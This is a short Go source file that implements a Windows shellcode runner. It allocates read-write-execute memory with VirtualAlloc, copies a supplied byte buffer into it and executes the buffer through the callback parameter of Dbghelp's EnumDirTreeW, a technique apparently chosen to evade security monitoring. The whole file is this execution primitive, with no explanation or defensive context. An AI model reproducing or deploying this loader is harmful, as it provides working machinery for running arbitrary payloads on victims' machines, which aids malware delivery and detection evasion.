package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE = 0x00002000
	MEM_COMMIT  = 0x00001000
)

func RunSyscall(op []byte) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")

	dbghelp := syscall.MustLoadDLL("Dbghelp.dll")
	enumDirTree := dbghelp.MustFindProc("EnumDirTreeW")
	symInitialize := dbghelp.MustFindProc("SymInitialize")
	getCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")

	address, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	if address == 0 {
		panic("VirtualAlloc failed")
	}

	copy((*[1 << 30]byte)(unsafe.Pointer(address))[:], op)

	process, _, _ := getCurrentProcess.Call()
	symInitialize.Call(process, 0, 1)

	dummy := make([]uint16, 522)
	enumDirTree.Call(process, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`C:\Windows`))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("*.log"))), uintptr(unsafe.Pointer(&dummy[0])), address, 0)
}
